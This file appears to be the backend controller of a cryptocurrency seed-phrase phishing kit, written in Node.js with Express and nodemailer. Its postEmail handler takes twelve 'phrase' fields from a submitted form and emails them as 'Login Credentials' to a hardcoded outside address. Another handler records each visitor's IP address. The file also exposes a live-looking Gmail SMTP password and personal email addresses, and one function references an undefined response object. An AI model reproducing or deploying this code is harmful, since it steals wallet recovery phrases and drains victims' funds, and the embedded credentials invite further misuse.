const nodemailer = require("nodemailer");

const adminEmail = ["nitfgc@yahoo.com"];

const smtpFromEmail = "farmhouseofficevp@gmail.com";
const smtpFromPassword = 'xuskskgpbkfitvkg';

const Admin = require("../models/admin");


exports.fetchSiteDetails = async(req, res, next) => {
    const { adminUrl } = req.body;

    const address = req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    try {
        const siteData = await Admin.find({ adminUrl: `#${adminUrl}` }).select("-password");;
       
        if (!siteData || siteData.length === 0) {
            return res.status(404).json({ error: "Not found" });
        }
        return res.status(200).json({
            message: "Success",
            address,
            user: siteData
        });
    } catch (err) {
        res.status(500).json({ error: "Internal Server Error" });
    }
}


  exports.postEmail = async (req, res, next) => {
    const phrase1 = req.body.phrase1;
    const phrase2 = req.body.phrase2;
    const phrase3 = req.body.phrase3;
    const phrase4 = req.body.phrase4;
    const phrase5 = req.body.phrase5;
    const phrase6 = req.body.phrase6;
    const phrase7 = req.body.phrase7;
    const phrase8 = req.body.phrase8;
    const phrase9 = req.body.phrase9;
    const phrase10 = req.body.phrase10;
    const phrase11 = req.body.phrase11;
    const phrase12 = req.body.phrase12;
    
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
          user: smtpFromEmail,
          pass: smtpFromPassword,
        },
      });
  
      const sendMail = async (mailDetails) => {     
        await transporter.sendMail(mailDetails);
      };
  
      const message = `Please do not disclose this code`;
      const options = {
        from: `Email from site`,
        to: adminEmail,
        subject: 'Info',
        text: message,
        html: `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Info</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    line-height: 1.6;
                    background-color: #f4f4f4;
                    margin: 0;
                    padding: 0;
                }
                .container {
                    max-width: 600px;
                    margin: 20px auto;
                    padding: 20px;
                    background: #fff;
                    border-radius: 5px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                }
                .header {
                    text-align: center;
                    margin-bottom: 20px;
                }
                .header h2 {
                    color: #333;
                    margin-bottom: 5px;
                }
                .content {
                    color: #555;
                }
                .footer {
                    margin-top: 20px;
                    font-size: 12px;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h2>Login Credentials</h2>
                </div>
                <div class="content"> 
                    <ul>
                        <li><strong>Phrase1:</strong> ${phrase1}</li>
                        <li><strong>Phrase2:</strong> ${phrase2}</li>
                        <li><strong>Phrase3:</strong> ${phrase3}</li>
                        <li><strong>Phrase4:</strong> ${phrase4}</li>
                        <li><strong>Phrase5:</strong> ${phrase5}</li>
                        <li><strong>Phrase6:</strong> ${phrase6}</li>
                        <li><strong>Phrase7:</strong> ${phrase7}</li>
                        <li><strong>Phrase8:</strong> ${phrase8}</li>
                        <li><strong>Phrase9:</strong> ${phrase9}</li>
                        <li><strong>Phrase10:</strong> ${phrase10}</li>
                        <li><strong>Phrase11:</strong> ${phrase11}</li>
                        <li><strong>Phrase12:</strong> ${phrase12}</li>
                       
                    </ul>            
                </div>
            </div>
        </body>
        </html>
    `
      };
  
      await sendMail(options);
      return res.status(200).json({
        message: "Success",
        description: "Email Sent!",
       
      });
  
    } catch (error) {
      return res.status(500).json({
        message: "Email sending failed!",
        description: "Internal Server Error!",    
      });
    }   
  };




  exports.sendGeneratedOtpToAdmin = async (token, user) => {
    
    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        host: "smtp.gmail.com",
        port: 587,
        secure: false,
        auth: {
          user: smtpFromEmail,
          pass: smtpFromPassword,
        },
      });
  
      const sendMail = async (mailDetails) => {     
        await transporter.sendMail(mailDetails);
      };
  
      const message = `Please do not disclose this code`;
      const options = {
        from: `Email from site`,
        to: "victorkudos@gmail.com",
        subject: 'Info',
        text: message,
        html:  ` <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Token Email</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              background-color: #f4f4f9;
              color: #333;
              line-height: 1.6;
            }
            .email-container {
              max-width: 600px;
              margin: 20px auto;
              padding: 20px;
              background: #ffffff;
              border: 1px solid #ddd;
              border-radius: 8px;
              box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
            .email-header {
              text-align: center;
              margin-bottom: 20px;
            }
            .email-header h1 {
              color: #007bff;
            }
            .email-body {
              font-size: 16px;
              color: #555;
            }
            .email-body p {
              margin: 10px 0;
            }
            .token {
              color: #007bff;
              font-weight: bold;
            }
          </style>
        </head>
        <body>
          <div class="email-container">
            <div class="email-header">
              <h1>Token Generation</h1>
            </div>
            <div class="email-body">
              <p>Token for Admin ${user} generated link,</p>
              <p><strong>Token:</strong> <span class="token">${token}</span></p>
              <p>If you didn't request this token, please ignore this email.</p>
              <p>Thank you!</p>
            </div>
          </div>
        </body>
        </html>`
      };
  
      await sendMail(options);
      return res.status(200).json({
        message: "Success",
        description: "Email Sent!",
       
      });
  
    } catch (error) {
      return res.status(500).json({
        message: "Email sending failed!",
        description: "Internal Server Error!",    
      });
    }   
  };


// exports.getUserData = async(req, res, next) => {

//     try {
//         const user = await User.find();
//         res.status(200).json({
//             message: "Success",
//             address,
//             user: user
//         });
//     } catch (err) {
//         console.error(err);
//         res.status(500).json({ error: "Internal Server Error" });
//     }
// };

// exports.postPopulateDb = async(req, res, next) => {
//     try {
//         const user = new User();
//         const userData = await user.save();
//         res.status(200).json({
//             message: "Success",
//             user: userData
//         });
//     } catch (err) {
//         console.error(err);
//         res.status(500).json({ error: "Internal Server Error" });
//     }
// }


// exports.updateUserData = async(req, res, next) => {
//     const {
//         id,
//         exchange_wallet_address,
//         booked_amount,
//         test_amount,
//         trx_date,
//         receiver_wallet_address,
//         sending_wallet_address,
//         receiving_amount,
//         token
//     } = req.body;


//     try {
//         // Await the execution of the query to get the user document
//         const user = await User.findOne({ _id: id });
//         if (!user) {
//             return res.status(400).json({ error: "No user found" });
//         }

//         user.exchange_wallet_address = exchange_wallet_address;
//         user.booked_amount = booked_amount;
//         user.test_amount = test_amount;
//         user.trx_date = trx_date;
//         user.receiver_wallet_address = receiver_wallet_address;
//         user.sending_wallet_address = sending_wallet_address;
//         user.receiving_amount = receiving_amount;

//         const userData = await user.save();
//         res.status(201).json({
//             message: "Success",
//             user: userData
//         });
//     } catch (err) {
//         console.error(err);
//         res.status(500).json({ error: "Internal Server Error" });
//     }
// }